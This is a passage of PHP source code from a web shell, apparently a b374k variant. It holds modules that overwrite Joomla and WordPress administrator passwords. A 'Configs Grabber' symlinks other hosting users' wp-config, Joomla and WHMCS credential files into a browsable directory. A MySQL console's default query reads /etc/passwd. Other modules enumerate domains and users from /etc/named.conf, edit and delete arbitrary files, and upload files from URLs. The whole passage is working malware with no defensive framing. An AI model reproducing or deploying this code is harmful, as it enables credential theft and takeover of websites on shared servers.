        $username = $_POST["username"];
        $password = $_POST["password"];
        $admin = $_POST["admin"];
        $pd = $_POST["pwd"];
        $pwd = md5($pd);
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        ($SQL = @mysql_query(
            "UPDATE " .
                $prefix .
                "users SET username ='" .
                $admin .
                "' WHERE name = 'Super User' or name = 'Super Utilisateur' or id='62'"
        )) or die(mysql_error());
        ($SQL = @mysql_query(
            "UPDATE " .
                $prefix .
                "users SET password ='" .
                $pwd .
                "' WHERE name = 'Super User' or name = 'Super Utilisateur' or id='62'"
        )) or die(mysql_error());
        if ($SQL) {
            echo "<br><br><center><h1>Done... go and login</h1></center>";
        }
    }
} elseif (isset($_GET["x"]) && $_GET["x"] == "mysql") {
    if (
        isset($_GET["sqlhost"]) &&
        isset($_GET["sqluser"]) &&
        isset($_GET["sqlpass"]) &&
        isset($_GET["sqlport"])
    ) {
        $sqlhost = $_GET["sqlhost"];
        $sqluser = $_GET["sqluser"];
        $sqlpass = $_GET["sqlpass"];
        $sqlport = $_GET["sqlport"];
        if (
            $con = @mysql_connect($sqlhost . ":" . $sqlport, $sqluser, $sqlpass)
        ) {
            $msg .= "<div style='width:99%;padding:4px 10px 0 10px;'>";
            $msg .=
                "<p>Connected to " .
                $sqluser .
                "<span class='gaya'>@</span>" .
                $sqlhost .
                ":" .
                $sqlport;
            $msg .=
                "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=" .
                $pwd .
                "&amp;x=mysql&amp;sqlhost=" .
                $sqlhost .
                "&amp;sqluser=" .
                $sqluser .
                "&amp;sqlpass=" .
                $sqlpass .
                "&amp;sqlport=" .
                $sqlport .
                "&amp;'>[ databases ]</a>";
            if (isset($_GET["db"])) {
                $msg .=
                    "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=" .
                    $pwd .
                    "&amp;x=mysql&amp;sqlhost=" .
                    $sqlhost .
                    "&amp;sqluser=" .
                    $sqluser .
                    "&amp;sqlpass=" .
                    $sqlpass .
                    "&amp;sqlport=" .
                    $sqlport .
                    "&amp;db=" .
                    $_GET["db"] .
                    "'>" .
                    htmlspecialchars($_GET["db"]) .
                    "</a>";
            }
            if (isset($_GET["table"])) {
                $msg .=
                    "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=" .
                    $pwd .
                    "&amp;x=mysql&amp;sqlhost=" .
                    $sqlhost .
                    "&amp;sqluser=" .
                    $sqluser .
                    "&amp;sqlpass=" .
                    $sqlpass .
                    "&amp;sqlport=" .
                    $sqlport .
                    "&amp;db=" .
                    $_GET["db"] .
                    "&amp;table=" .
                    $_GET["table"] .
                    "'>" .
                    htmlspecialchars($_GET["table"]) .
                    "</a>";
            }
            $msg .=
                "</p><p>version : " .
                mysql_get_server_info($con) .
                " proto " .
                mysql_get_proto_info($con) .
                "</p>";
            $msg .= "</div>";
            echo $msg;
            if (
                isset($_GET["db"]) &&
                !isset($_GET["table"]) &&
                !isset($_GET["sqlquery"])
            ) {
                $db = $_GET["db"];
                $query =
                    "DROP TABLE IF EXISTS b374k_table;\nCREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE '/etc/passwd'\nINTO TABLE b374k_table;SELECT * FROM b374k_table;\nDROP TABLE IF EXISTS b374k_table;";
                $msg =
                    "<div style='width:99%;padding:0 10px;'><form action='?' method='get'><input type='hidden' name='y' value='" .
                    $pwd .
                    "' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='" .
                    $sqlhost .
                    "' /> <input type='hidden' name='sqluser' value='" .
                    $sqluser .
                    "' /> <input type='hidden' name='sqlport' value='" .
                    $sqlport .
                    "' /> <input type='hidden' name='sqlpass' value='" .
                    $sqlpass .
                    "' /> <input type='hidden' name='db' value='" .
                    $db .
                    "' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>$query</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";
                $tables = [];
                $msg .=
                    "<table class='explore' style='width:99%;'><tr><th>available tables on " .
                    $db .
                    "</th></tr>";
                $hasil = @mysql_list_tables($db, $con);
                while (list($table) = @mysql_fetch_row($hasil)) {
                    @array_push($tables, $table);
                }
                @sort($tables);
                foreach ($tables as $table) {
                    $msg .=
                        "<tr><td><a href='?y=" .
                        $pwd .
                        "&amp;x=mysql&amp;sqlhost=" .
                        $sqlhost .
                        "&amp;sqluser=" .
                        $sqluser .
                        "&amp;sqlpass=" .
                        $sqlpass .
                        "&amp;sqlport=" .
                        $sqlport .
                        "&amp;db=" .
                        $db .
                        "&amp;table=" .
                        $table .
                        "'>$table</a></td></tr>";
                }
                $msg .= "</table>";
            } elseif (isset($_GET["table"]) && !isset($_GET["sqlquery"])) {
                $db = $_GET["db"];
                $table = $_GET["table"];
                $query =
                    "SELECT * FROM " . $db . "." . $table . " LIMIT 0,100;";
                $msgq =
                    "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='" .
                    $pwd .
                    "' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='" .
                    $sqlhost .
                    "' /> <input type='hidden' name='sqluser' value='" .
                    $sqluser .
                    "' /> <input type='hidden' name='sqlport' value='" .
                    $sqlport .
                    "' /> <input type='hidden' name='sqlpass' value='" .
                    $sqlpass .
                    "' /> <input type='hidden' name='db' value='" .
                    $db .
                    "' /> <input type='hidden' name='table' value='" .
                    $table .
                    "' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>" .
                    $query .
                    "</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";
                $columns = [];
                $msg = "<table class='explore' style='width:99%;'>";
                $hasil = @mysql_query("SHOW FIELDS FROM " . $db . "." . $table);
                while (list($column) = @mysql_fetch_row($hasil)) {
                    $msg .= "<th>$column</th>";
                    $kolum = $column;
                }
                $msg .= "</tr>";
                $hasil = @mysql_query(
                    "SELECT count(*) FROM " . $db . "." . $table
                );
                list($total) = mysql_fetch_row($hasil);
                if (isset($_GET["z"])) {
                    $page = (int) $_GET["z"];
                } else {
                    $page = 1;
                }
                $pagenum = 100;
                $totpage = ceil($total / $pagenum);
                $start = ($page - 1) * $pagenum;
                $hasil = @mysql_query(
                    "SELECT * FROM " .
                        $db .
                        "." .
                        $table .
                        " LIMIT " .
                        $start .
                        "," .
                        $pagenum
                );
                while ($datas = @mysql_fetch_assoc($hasil)) {
                    $msg .= "<tr>";
                    foreach ($datas as $data) {
                        if (trim($data) == "") {
                            $data = "&nbsp;";
                        }
                        $msg .= "<td>$data</td>";
                    }
                    $msg .= "</tr>";
                }
                $msg .= "</table>";
                $head =
                    "<div style='padding:10px 0 0 6px;'> <form action='?' method='get'> <input type='hidden' name='y' value='" .
                    $pwd .
                    "' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='" .
                    $sqlhost .
                    "' /> <input type='hidden' name='sqluser' value='" .
                    $sqluser .
                    "' /> <input type='hidden' name='sqlport' value='" .
                    $sqlport .
                    "' /> <input type='hidden' name='sqlpass' value='" .
                    $sqlpass .
                    "' /> <input type='hidden' name='db' value='" .
                    $db .
                    "' /> <input type='hidden' name='table' value='" .
                    $table .
                    "' /> Page <select class='inputz' name='z' onchange='this.form.submit();'>";
                for ($i = 1; $i <= $totpage; $i++) {
                    $head .= "<option value='" . $i . "'>" . $i . "</option>";
                    if ($i == $_GET["z"]) {
                        $head .=
                            "<option value='" .
                            $i .
                            "' selected='selected'>" .
                            $i .
                            "</option>";
                    }
                }
                $head .=
                    "</select><noscript><input class='inputzbut' type='submit' value='Go !' /></noscript></form></div>";
                $msg = $msgq . $head . $msg;
            } elseif (isset($_GET["submitquery"]) && $_GET["sqlquery"] != "") {
                $db = $_GET["db"];
                $query = magicboom($_GET["sqlquery"]);
                $msg =
                    "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='" .
                    $pwd .
                    "' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='" .
                    $sqlhost .
                    "' /> <input type='hidden' name='sqluser' value='" .
                    $sqluser .
                    "' /> <input type='hidden' name='sqlport' value='" .
                    $sqlport .
                    "' /> <input type='hidden' name='sqlpass' value='" .
                    $sqlpass .
                    "' /> <input type='hidden' name='db' value='" .
                    $db .
                    "' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>" .
                    $query .
                    "</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";
                @mysql_select_db($db);
                $querys = explode(";", $query);
                foreach ($querys as $query) {
                    if (trim($query) != "") {
                        $hasil = mysql_query($query);
                        if ($hasil) {
                            $msg .=
                                "<p style='padding:0;margin:20px 6px 0 6px;'>" .
                                $query .
                                ";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";
                            $msg .=
                                "<table class='explore' style='width:99%;'><tr>";
                            for ($i = 0; $i < @mysql_num_fields($hasil); $i++) {
                                $msg .=
                                    "<th>" .
                                    htmlspecialchars(
                                        @mysql_field_name($hasil, $i)
                                    ) .
                                    "</th>";
                            }
                            $msg .= "</tr>";
                            for ($i = 0; $i < @mysql_num_rows($hasil); $i++) {
                                $rows = @mysql_fetch_array($hasil);
                                $msg .= "<tr>";
                                for (
                                    $j = 0;
                                    $j < @mysql_num_fields($hasil);
                                    $j++
                                ) {
                                    if ($rows[$j] == "") {
                                        $dataz = "&nbsp;";
                                    } else {
                                        $dataz = $rows[$j];
                                    }
                                    $msg .= "<td>" . $dataz . "</td>";
                                }
                                $msg .= "</tr>";
                            }
                            $msg .= "</table>";
                        } else {
                            $msg .=
                                "<p style='padding:0;margin:20px 6px 0 6px;'>" .
                                $query .
                                ";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";
                        }
                    }
                }
            } else {
                $query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";
                $msg =
                    "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='" .
                    $pwd .
                    "' /><input type='hidden' name='x' value='mysql' /><input type='hidden' name='sqlhost' value='" .
                    $sqlhost .
                    "' /><input type='hidden' name='sqluser' value='" .
                    $sqluser .
                    "' /><input type='hidden' name='sqlport' value='" .
                    $sqlport .
                    "' /><input type='hidden' name='sqlpass' value='" .
                    $sqlpass .
                    "' /><input type='hidden' name='db' value='" .
                    $db .
                    "' /><p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>" .
                    $query .
                    "</textarea></p><p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p></form></div> ";
                $dbs = [];
                $msg .=
                    "<table class='explore' style='width:99%;'><tr><th>available databases</th></tr>";
                $hasil = @mysql_list_dbs($con);
                while (list($db) = @mysql_fetch_row($hasil)) {
                    @array_push($dbs, $db);
                }
                @sort($dbs);
                foreach ($dbs as $db) {
                    $msg .=
                        "<tr><td><a href='?y=" .
                        $pwd .
                        "&amp;x=mysql&amp;sqlhost=" .
                        $sqlhost .
                        "&amp;sqluser=" .
                        $sqluser .
                        "&amp;sqlpass=" .
                        $sqlpass .
                        "&amp;sqlport=" .
                        $sqlport .
                        "&amp;db=" .
                        $db .
                        "'>$db</a></td></tr>";
                }
                $msg .= "</table>";
            }
            @mysql_close($con);
        } else {
            $msg = "<p style='text-align:center;'>can't connect</p>";
        }
        echo $msg;
    } else {
         ?> 
<br><center><div class="mybox"><h2 class="k2ll33d2">MySQL Connect</h2><form action="?" method="get"><input type="hidden" name="y" value="<?php echo $pwd; ?>" /> <input type="hidden" name="x" value="mysql" /><table class="tabnet" style="width:300px;"> <tr><th colspan="2">Connection Form</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr></table></form></div></center>
<?php
    }
} elseif (
    isset($_GET["x"]) &&
    $_GET["x"] == "configs"
) { ?><br><br><center><div class='mybox'><?php
if (
    empty($_POST["conf"])
) { ?><h2 class='k2ll33d2'>Configs Grabber</h2><br><p>/etc/passwd content</p><form method="POST"><textarea name="passwd" class='output' rows=20><?php echo file_get_contents(
    "/etc/passwd"
); ?></textarea><br><br><input name="conf" class='inputzbut' size="80" value="GET'em" type="submit"><br></form></div></center><?php }
if ($_POST["conf"]) {
    $function = $functions = @ini_get("disable_functions");
    if (eregi("symlink", $functions)) {
        die("<error>Symlink is disabled :( </error>");
    }
    @mkdir("configs", 0755);
    @chdir("configs");
    $htaccess = "
Options all
Options +Indexes
Options +FollowSymLinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None 
Satisfy Any
";
    file_put_contents(".htaccess", $htaccess, FILE_APPEND);
    $passwd = $_POST["passwd"];
    $passwd = explode("\n", $passwd);
    echo "<center class='k2ll33d2'>wait ...<center>";
    foreach ($passwd as $pwd) {
        $pawd = explode(":", $pwd);
        $user = $pawd[0];
        @symlink(
            "/home/" . $user . "/public_html/wp-config.php",
            $user . "-wp13.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/wp/wp-config.php",
            $user . "-wp13-wp.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/WP/wp-config.php",
            $user . "-wp13-WP.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/wp/beta/wp-config.php",
            $user . "-wp13-wp-beta.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/beta/wp-config.php",
            $user . "-wp13-beta.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/press/wp-config.php",
            $user . "-wp13-press.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/wordpress/wp-config.php",
            $user . "-wp13-wordpress.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/Wordpress/wp-config.php",
            $user . "-wp13-Wordpress.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/blog/wp-config.php",
            $user . "-wp13-Wordpress.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/wordpress/beta/wp-config.php",
            $user . "-wp13-wordpress-beta.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/news/wp-config.php",
            $user . "-wp13-news.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/new/wp-config.php",
            $user . "-wp13-new.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/blog/wp-config.php",
            $user . "-wp-blog.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/beta/wp-config.php",
            $user . "-wp-beta.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/blogs/wp-config.php",
            $user . "-wp-blogs.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/home/wp-config.php",
            $user . "-wp-home.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/protal/wp-config.php",
            $user . "-wp-protal.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/site/wp-config.php",
            $user . "-wp-site.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/main/wp-config.php",
            $user . "-wp-main.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/test/wp-config.php",
            $user . "-wp-test.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/joomla/configuration.php",
            $user . "-joomla2.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/protal/configuration.php",
            $user . "-joomla-protal.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/joo/configuration.php",
            $user . "-joo.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/cms/configuration.php",
            $user . "-joomla-cms.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/site/configuration.php",
            $user . "-joomla-site.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/main/configuration.php",
            $user . "-joomla-main.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/news/configuration.php",
            $user . "-joomla-news.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/new/configuration.php",
            $user . "-joomla-new.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/home/configuration.php",
            $user . "-joomla-home.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/vb/includes/config.php",
            $user . "-vb-config.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/whm/configuration.php",
            $user . "-whm15.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/central/configuration.php",
            $user . "-whm-central.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/whm/whmcs/configuration.php",
            $user . "-whm-whmcs.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/whm/WHMCS/configuration.php",
            $user . "-whm-WHMCS.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/whmc/WHM/configuration.php",
            $user . "-whmc-WHM.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/whmcs/configuration.php",
            $user . "-whmcs.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/support/configuration.php",
            $user . "-support.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/configuration.php",
            $user . "-joomla.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/submitticket.php",
            $user . "-whmcs2.txt"
        );
        @symlink(
            "/home/" . $user . "/public_html/whm/configuration.php",
            $user . "-whm.txt"
        );
    }
    echo 'Done -> <a href="configs">configs</a>';
}
} elseif (isset($_GET["x"]) && $_GET["x"] == "config") {
    error_reporting(0);
    if ($_POST["kill"]) {
        $url = $_POST["url"];
        $user = $_POST["user"];
        $pass = $_POST["pass"];
        $pss = md5($pass);
        function enter($text, $a, $b)
        {
            $explode = explode($a, $text);
            $explode = explode($b, $explode[1]);
            return $explode[0];
        }
        $config = file_get_contents($url);
        $password = enter($config, "define('DB_PASSWORD', '", "');");
        $username = enter($config, "define('DB_USER', '", "');");
        $db = enter($config, "define('DB_NAME', '", "');");
        $prefix = enter($config, '$table_prefix  = \'', "';");
        $host = enter($config, "define('DB_HOST', '", "');");
        if ($config && preg_match("/DB_NAME/i", $config)) {
            ($conn = @mysql_connect($host, $username, $password)) or
                die("i can't connect to mysql, check your data");
            @mysql_select_db($db, $conn) or die(mysql_error());
            $grab = @mysql_query(
                "SELECT * from  `wp_options` WHERE option_name='home'"
            );
            $data = @mysql_fetch_array($grab);
            $site_url = $data["option_value"];
            $query = mysql_query(
                "UPDATE `" .
                    $prefix .
                    "users` SET `user_login` = '" .
                    $user .
                    "',`user_pass` = '" .
                    $pss .
                    "' WHERE `ID` = 1"
            );
            if ($query) {
                echo '<center><h2 class="k2ll33d2">Done !</h2></center><br><table width="100%"><tr><th width="20%">site</th><th width="20%">user</th><th with="20%">password</th><th width="20%">link</th></tr><tr><td width="20%"><font size="2" color="red">' .
                    $site_url .
                    '</font></td><td width="20%">' .
                    $user .
                    '</td><td with="20%">' .
                    $pass .
                    '</td><td width="20%"><a href="' .
                    $site_url .
                    '/wp-login.php"><font color="#00ff00">login</font></td></tr></table>';
            } else {
                echo '<h2 class="k2ll33d2"><font color="#ff0000">ERROR !</font></h2>';
            }
        } else {
            die('<h2 class="k2ll33d2">Not a wordpress config</h2>');
        }
    } else {
         ?> <center><br><br><div class="mybox"><form method="post"><h2 style='font-size:26px;' class='k2ll33d2'>Wordpress login changer ( symlink version )</h2><br><table><tr><td>config link&nbsp;:&nbsp;</td><td><input size="26" class="inputz" type="text" name="url" value=""></td></tr><tr><td>new user&nbsp;:&nbsp;</td><td><input class="inputz" type="text" name="user" size="26" value="admin"></td></tr><tr><td>new password&nbsp;:&nbsp;</td><td><input class="inputz" type="text" size="26" name="pass" value="123123"></td></tr><tr><td><br></td></tr><tr><td><input class="inputzbut" type="submit" name="kill" value=" change "></td><br></tr></table></form></div></center><?php
    }
} elseif (isset($_GET["x"]) && $_GET["x"] == "domains") {
    echo "<br><br><center><div class='mybox'><p align='center' class='k2ll33d2'>Domains and Users</p>";
    $d0mains = @file("/etc/named.conf");
    if (!$d0mains) {
        die("<center>Error : i can't read [ /etc/named.conf ]</center>");
    }
    echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';
    foreach ($d0mains as $d0main) {
        if (eregi("zone", $d0main)) {
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2) {
                $user = posix_getpwuid(
                    @fileowner("/etc/valiases/" . $domains[1][0])
                );
                echo "<tr><td><a href=http://www." .
                    $domains[1][0] .
                    "/>" .
                    $domains[1][0] .
                    "</a></td><td>" .
                    $user["name"] .
                    "</td></tr>";
                flush();
            }
        }
    }
    echo "</div></center>";
} elseif (isset($_GET["x"]) && $_GET["x"] == "keyboard") {
    if (empty($_POST["pwd"])) {
        echo "<br><br><center><div class='mybox'><h2 style='font-size:40px;' class='k2ll33d2'>Wordpress login changer</h2><FORM method='POST'>DB_Prefix :  <INPUT class ='inputz' size='8' value='wp_' name='prefix' type='text'>&nbsp;&nbsp;host :  <INPUT class ='inputz' size='10' value='localhost' name='localhost' type='text'>&nbsp;&nbsp;database :  <INPUT class ='inputz' size='10' value='Database' name='database' type='text'>&nbsp;&nbsp;username :  <INPUT class ='inputz' size='10' value='db_user' name='username' type='text'>&nbsp;&nbsp;password :  <INPUT class ='inputz' size='10' value='db_pass' name='password' type='text'>&nbsp;&nbsp;<br><br>New username :  <INPUT class ='inputz' name='admin' size='15' value='k2'><br><br>New password :  <INPUT class ='inputz' name='pwd' size='15' value='123123'><br>&nbsp;&nbsp;<br><INPUT class='inputzbut' value='change' name='send' type='submit'></FORM></div/></center>";
    } else {
        $prefix = $_POST["prefix"];
        $localhost = $_POST["localhost"];
        $database = $_POST["database"];
        $username = $_POST["username"];
        $password = $_POST["password"];
        $pwd = $_POST["pwd"];
        $admin = $_POST["admin"];
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        $hash = crypt($pwd);
        $grab = @mysql_query(
            "SELECT * from  `" . $prefix . "options` WHERE option_name='home'"
        );
        $data = @mysql_fetch_array($grab);
        $site_url = $data["option_value"];
        ($k2 = @mysql_query(
            "UPDATE " .
                $prefix .
                "users SET user_login ='" .
                $admin .
                "' WHERE ID = 1"
        )) or die(mysql_error());
        ($k2 = @mysql_query(
            "UPDATE " .
                $prefix .
                "users SET user_pass ='" .
                $hash .
                "' WHERE ID = 1"
        )) or die(mysql_error());
        if ($k2) {
            echo '<br><br><center><h1>Done ... -> <a href="' .
                $site_url .
                '/wp-login.php" target="_blank">Login</a></h1></center>';
        }
    }
    echo "</center>";
} elseif (isset($_GET["x"]) && $_GET["x"] == "string") {
    $text =
        $_POST[
            "code"
        ]; ?><center><br><br><div class="mybox"><h2 class="k2ll33d2">String encoder</h2><form method="post"><br><textarea class='inputz' cols=80 rows=5 name="code">k2ll33d</textarea><br><br><select class='inputz' size="1" name="ope"><option value="base64">Base64</option><option value="md5">md5</option><option value="whash">Crypt</option><option value="SHA1">SHA1</option><option value="urlencode">URL Encoding</option><option value="md4">md4</option><option value="SHA256">SHA256</option></select>&nbsp;<input class='inputzbut' type='submit' value='encrypt'></form><?php
$op = $_POST["ope"];
switch ($op) {
    case "base64":
        $codi = base64_encode($text);
        break;
    case "md5":
        $codi = md5($text);
        break;
    case "whash":
        $codi = crypt($text);
        break;
    case "SHA1":
        $codi = sha1($text);
        break;
    case "urlencode":
        $codi = urlencode($text);
        break;
    case "md4":
        $codi = hash("md4", $text);
        break;
    case "SHA256":
        $codi = hash("sha256", $text);
        break;
    default:
        break;
}
echo '<textarea cols=80 rows=10 class="inputz" readonly>' .
    $codi .
    "</textarea></div></center>";

} elseif (isset($_GET["x"]) && $_GET["x"] == "phpinfo") {
    @ob_start();
    @eval("phpinfo();");
    $buff = @ob_get_contents();
    @ob_end_clean();
    $awal = strpos($buff, "<body>") + 6;
    $akhir = strpos($buff, "</body>");
    echo "<div class='phpinfo'>" .
        substr($buff, $awal, $akhir - $awal) .
        "</div>";
} elseif (isset($_GET["view"]) && $_GET["view"] != "") {
    if (is_file($_GET["view"])) {
        if (!isset($file)) {
            $file = magicboom($_GET["view"]);
        }
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner =
                $name["name"] .
                "<span class='gaya'> : </span>" .
                $group["name"];
        } else {
            $owner = $user;
        }
        $filn = basename($file);
        echo "<table style='margin:6px 0 0 2px;line-height:20px;'> <tr><td>Filename</td><td><span id='" .
            clearspace($filn) .
            "_link'>" .
            $file .
            "</span> <form action='?y=" .
            $pwd .
            "&amp;view=$file' method='post' id='" .
            clearspace($filn) .
            "_form' class='sembunyi' style='margin:0;padding:0;'> <input type='hidden' name='oldname' value='" .
            $filn .
            "' style='margin:0;padding:0;' /> <input class='inputz' style='width:200px;' type='text' name='newname' value='" .
            $filn .
            "' /> <input class='inputzbut' type='submit' name='rename' value='rename' /> <input class='inputzbut' type='submit' name='cancel' value='cancel' onclick='tukar('" .
            clearspace($filn) .
            "_link','" .
            clearspace($filn) .
            "_form');' /> </form> </td></tr> <tr><td>Size</td><td>" .
            ukuran($file) .
            "</td></tr> <tr><td>Permission</td><td>" .
            get_perms($file) .
            "</td></tr> <tr><td>Owner</td><td>" .
            $owner .
            "</td></tr> <tr><td>Create time</td><td>" .
            date("d-M-Y H:i", @filectime($file)) .
            "</td></tr> <tr><td>Last modified</td><td>" .
            date("d-M-Y H:i", @filemtime($file)) .
            "</td></tr> <tr><td>Last accessed</td><td>" .
            date("d-M-Y H:i", @fileatime($file)) .
            "</td></tr> <tr><td>Actions</td><td><a href='?y=$pwd&amp;edit=$file'>edit</a> | <a href=\"javascript:tukar('" .
            clearspace($filn) .
            "_link','" .
            clearspace($filn) .
            "_form');\">rename</a> | <a href='?y=$pwd&amp;delete=$file'>delete</a> | <a href='?y=$pwd&amp;dl=$file'>download</a>&nbsp;(<a href='?y=$pwd&amp;dlgzip=$file'>gzip</a>)</td></tr> <tr><td>View</td><td><a href='?y=" .
            $pwd .
            "&amp;view=" .
            $file .
            "'>text</a> | <a href='?y=" .
            $pwd .
            "&amp;view=" .
            $file .
            "&amp;type=code'>code</a> | <a href='?y=" .
            $pwd .
            "&amp;view=" .
            $file .
            "&amp;type=image'>image</a></td></tr></table>";
        if (isset($_GET["type"]) && $_GET["type"] == "image") {
            echo "<div style='text-align:center;margin:8px;'><img src='?y=" .
                $pwd .
                "&amp;img=" .
                $filn .
                "'></div>";
        } elseif (isset($_GET["type"]) && $_GET["type"] == "code") {
            echo "<div class='viewfile'>";
            $file = wordwrap(@file_get_contents($file), "240", "\n");
            @highlight_string($file);
            echo "</div>";
        } else {
            echo "<div class='viewfile'>";
            echo nl2br(htmlentities(@file_get_contents($file)));
            echo "</div>";
        }
    } elseif (is_dir($_GET["view"])) {
        echo showdir($pwd, $prompt);
    }
} elseif (isset($_GET["edit"]) && $_GET["edit"] != "") {

    if (isset($_POST["save"])) {
        $file = $_POST["saveas"];
        $content = magicboom($_POST["content"]);
        if ($filez = @fopen($file, "w")) {
            $time = date("d-M-Y H:i", time());
            if (@fwrite($filez, $content)) {
                $msg = "file saved <span class='gaya'>@</span> " . $time;
            } else {
                $msg = "failed to save";
            }
            @fclose($filez);
        } else {
            $msg = "permission denied";
        }
    }
    if (!isset($file)) {
        $file = $_GET["edit"];
    }
    if ($filez = @fopen($file, "r")) {
        $content = "";
        while (!feof($filez)) {
            $content .= htmlentities(str_replace("''", "'", fgets($filez)));
        }
        @fclose($filez);
    }
    ?><form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post"> <table class="cmdbox"> <tr><td colspan="2"> 
<textarea class="output" name="content"> 
<?php echo $content; ?></textarea> <tr>
<td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?></td></tr></table></form> <?php
} elseif (isset($_GET["x"]) && $_GET["x"] == "upload") {
    if (isset($_POST["uploadcomp"])) {
        if (is_uploaded_file($_FILES["file"]["tmp_name"])) {
            $path = magicboom($_POST["path"]);
            $fname = $_FILES["file"]["name"];
            $tmp_name = $_FILES["file"]["tmp_name"];
            $pindah = $path . $fname;
            $stat = @move_uploaded_file($tmp_name, $pindah);
            if ($stat) {
                $msg = "file uploaded to $pindah";
            } else {
                $msg = "failed to upload $fname";
            }
        } else {
            $msg = "failed to upload $fname";
        }
    } elseif (isset($_POST["uploadurl"])) {
        $pilihan = trim($_POST["pilihan"]);
        $wurl = trim($_POST["wurl"]);
        $path = magicboom($_POST["path"]);
        $namafile = download($pilihan, $wurl);
        $pindah = $path . $namafile;
        if (is_file($pindah)) {
            $msg = "file uploaded to $pindah";
        } else {
            $msg = "failed to upload $namafile";
        }
